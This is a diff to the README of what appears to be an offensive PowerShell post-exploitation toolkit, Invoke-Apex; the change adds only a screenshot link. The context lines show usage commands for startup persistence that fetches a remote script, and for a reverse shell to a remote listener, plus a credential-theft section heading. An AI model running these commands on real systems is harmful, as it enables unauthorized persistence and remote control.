@@ -278,6 +278,8 @@ PS> Invoke-Persistence -StartupLnk -PsFileUrl http://192.168.42.89/script.ps1
 ## Invoke-Connect
 Transfers all Apex functionality to a remote SSL listener, and also functions as a non-interactive powershell reverse "shell" if invoked as a stand-alone cmdlet. (SSL-enabled listener is required)
 
+![screenshot](https://raw.githubusercontent.com/securemode/Invoke-Apex/master/img/Invoke-Connect.png)
+
 Usage: ```PS> Invoke-Connect -ListenerIp 192.168.1.1 -ListenerPort 443```
 
 ## Invoke-Creds
